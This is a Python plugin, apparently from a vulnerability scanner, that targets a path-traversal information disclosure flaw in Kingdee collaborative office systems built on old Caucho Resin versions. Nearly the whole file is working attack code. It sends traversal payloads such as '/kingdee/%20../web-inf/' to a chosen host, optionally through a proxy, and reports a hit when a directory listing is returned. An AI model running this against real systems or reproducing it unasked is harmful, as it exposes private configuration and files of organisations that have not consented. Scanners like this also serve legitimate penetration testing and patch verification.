#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金蝶协同平台远程信息泄露漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0126353
author: Ascotbe
reference: Lucifer
description: 金蝶协同办公系统基于resin引用了漏洞组件导致远程信息泄露。
            受影响系统：
            Caucho Technology Resin v3.1.0 for Windows
            Caucho Technology Resin v3.0.21 for Windows
            Caucho Technology Resin v3.0.20 for Windows
            Caucho Technology Resin v3.0.19 for Windows
            Caucho Technology Resin v3.0.18 for Windows
            Caucho Technology Resin v3.0.17 for Windows
            Caucho Technology Resin Professional v3.1.0 for Window
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/kingdee/%20../web-inf/", "/kingdee/%20../editor/", "/kingdee/%20../disk/"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp

    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        for payload in payloads:
            payload_url = scheme + "://" + url + payload
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('directory')!=-1:
                Medusa = "{} 存在金蝶协同系统远程信息泄露漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                return (Medusa)
    except Exception as e:
        pass